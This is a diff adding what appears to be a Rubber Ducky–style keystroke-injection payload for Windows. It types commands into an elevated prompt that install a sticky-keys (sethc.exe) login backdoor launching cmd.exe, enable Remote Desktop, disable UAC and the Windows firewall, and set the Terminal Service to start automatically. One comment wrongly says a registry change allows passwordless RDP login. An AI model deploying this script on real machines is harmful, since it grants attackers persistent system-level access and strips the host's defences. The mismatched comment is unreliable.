@@ -1,0 +1,38 @@
+>>>CMD<<<
+
+REM bypass uac if enabled
+ALT j
+DELAY 50
+ENTER
+
+REM login backdoor press 5 times shift to get command prompt
+STRING reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+ENTER
+
+REM enable rdp
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+ENTER
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 1 /f
+ENTER
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f
+ENTER
+
+REM allow to login over rdp without password
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "LimitBlankPasswordUse" /t REG_DWORD /d 1 /f
+ENTER
+
+REM disable uac
+STRING reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
+ENTER
+STRING reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+ENTER
+
+REM disable windows firewall
+STRING netsh firewall set opmode disable
+ENTER
+
+REM another code for enabling rdp
+STRING sc config TermService start= auto
+ENTER
+STRING net start TermService
+ENTER
